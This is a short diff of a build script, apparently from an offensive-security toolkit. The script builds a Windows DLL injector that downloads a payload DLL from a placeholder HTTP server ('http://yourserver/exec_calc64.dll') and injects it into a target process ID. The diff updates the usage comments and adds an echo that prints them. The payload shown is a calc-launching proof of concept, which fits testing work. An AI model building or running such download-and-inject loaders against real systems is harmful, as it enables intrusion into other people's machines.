@@ -6,7 +6,7 @@
 
 # Host the generated dll payload via HTTP on port 80
 # Call the injector executable like:
-# output.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
+# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
 # "random" just fills argv[2], which is not needed here
 
 # The download mechanism, as deployed here, is kind of a workaround to deliver the payload to the target.
@@ -67,3 +67,9 @@ strip output/injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_wi
 
 # cleanup
 cleanup_techniques
+
+echo "
+# Host the generated dll payload via HTTP on port 80
+# Call the injector executable like:
+# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
+# 'random' just fills argv[2], which is not needed here"
